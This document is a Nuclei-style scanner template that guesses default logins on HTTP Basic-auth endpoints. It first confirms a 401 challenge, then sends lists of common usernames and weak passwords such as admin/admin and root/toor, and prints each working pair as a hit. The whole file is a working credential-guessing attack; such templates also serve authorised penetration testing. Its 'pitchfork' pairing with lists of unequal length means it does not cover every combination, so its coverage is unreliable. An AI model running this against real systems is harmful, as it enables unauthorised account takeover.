id: default-credentials-401-bruteforce
info:
  name: Default Credentials Bruteforce (401 gate)
  author: yourhandle
  severity: high
  tags: default-login,basic-auth
flow: http(1) && http(2)
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: dsl
        dsl:
          - "status_code == 401"
          - "contains(tolower(header), 'www-authenticate')"
        condition: and
        internal: true
  - method: GET
    path:
      - "{{BaseURL}}"
    attack: pitchfork
    payloads:
      username:
        - admin
        - administrator
        - root
        - user
        - guest
        - test
        - support
        - operator
        - superadmin
        - sysadmin
        - service
        - manager
        - monitor
        - netadmin
        - cisco
        - ubnt
        - pi
        - oracle
        - postgres
        - sa
      password:
        - admin
        - admin123
        - administrator
        - password
        - password123
        - 123456
        - 12345678
        - 1234567890
        - root
        - toor
        - guest
        - test
        - support
        - service
        - changeme
        - change_me
        - default
        - 1234
        - 0000
        - ""
        - "{{username}}"
    headers:
      Authorization: "Basic {{base64(username + ':' + password)}}"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 || status_code == 302"
          - "!contains(tolower(header), 'www-authenticate')"
        condition: and
    extractors:
      - type: dsl
        dsl:
          - '"[HIT] " + BaseURL + " | " + username + ":" + password'
